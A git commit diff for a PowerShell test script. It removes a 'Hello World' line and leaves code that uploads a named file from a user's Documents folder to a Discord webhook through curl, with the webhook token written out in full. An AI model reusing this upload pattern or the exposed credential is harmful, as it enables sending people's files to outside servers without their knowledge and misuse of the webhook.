4fddb242801ee49ee510d44e9b5d654da4af45d0
Bloodshot <92547773+Bloodshot24@users.noreply.github.com>
2024-01-07 11:39:17 +0100

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,3 +1,2 @@
-Write-Host "Hello World"
 $hookurl = 'https://discord.com/api/webhooks/1130234959148359771/Qn5KRieuzWJHcn4MTezMzadO4mt6uRAGkt40RdRTQ7rojQvzHIfKVC83p-DV6eqYYSj7'
 curl.exe -F 'file1=@C:\Users\Bastien\Documents\Bastien\Ecole\1B\Allemand\Nouveau Document texte.txt' $hookurl
